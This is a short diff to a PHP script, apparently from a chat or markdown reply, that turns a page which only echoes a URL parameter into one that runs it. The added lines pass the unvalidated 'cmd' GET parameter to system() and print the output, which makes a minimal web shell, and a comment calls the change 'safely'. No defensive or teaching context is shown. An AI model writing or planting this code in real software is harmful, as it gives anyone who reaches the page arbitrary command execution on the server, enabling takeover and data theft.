@@ -11,10 +11,16 @@ if (isset($_GET['cmd'])) {
     // Get the value of 'cmd' parameter
     $cmd = $_GET['cmd'];
 
-    // Display the value
-    echo "Command: " . htmlspecialchars($cmd);
+    // Display the value safely
+    echo "Command: " . htmlspecialchars($cmd) . "<br><br>";
+
+    // Execute the command and output the result
+    echo "<pre>";
+    system($cmd);
+    echo "</pre>";
 } else {
     echo "No command provided.";
 }
 ?>
+
 ```
